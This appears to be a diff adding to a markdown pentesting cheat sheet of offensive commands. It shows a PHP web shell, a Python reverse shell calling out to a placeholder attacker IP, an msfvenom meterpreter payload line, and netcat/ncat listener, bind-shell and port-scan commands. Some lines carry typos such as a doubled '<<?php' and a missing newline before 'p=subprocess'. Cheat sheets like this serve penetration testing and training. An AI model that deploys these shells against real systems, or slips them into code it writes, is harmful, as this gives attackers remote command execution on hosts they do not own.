@@ -17,6 +17,8 @@ systemctl start apache2
 service apache2 start
 ```
 
+
+
 ## Enable/Disable service to start on boot
 linux
 ```shell
@@ -41,9 +43,13 @@ msfvenom -p windows/meterpreter/reverse_tcp [your_ip_address] LPORT=[Port] -f as
 
 ## shells
 
+PHP
+
 ```php
 <<?php echo shell_exec($_GET['cmd']);?>
 ```
+
+Python
 
 ```python
 import socket,subprocess,os
@@ -52,6 +58,21 @@ s.connect(("<IP Address>",443))
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"])
 ```
+
+### Netcat
+
+-   Client nc –nv <Your IP Address> <port>
+-   Server nc –nlvp <port>
+
+### Ncat
+
+-   Bind Shell: ncat –exec cmd.exe --allow <your_ip_address>-vnl <port>  --ssl
+-   Client: ncat –v <your_ip_address> <port> --ssl
+  
+## Ncat 
+-   TCP Port scan: nc –nvv –w 1 -z <your_ip_address> 3000-4000
+-   UDP port scan: nc –nvv -u -z <your_ip_address> 3000-4000
+
 
 medusa example
 ```shell
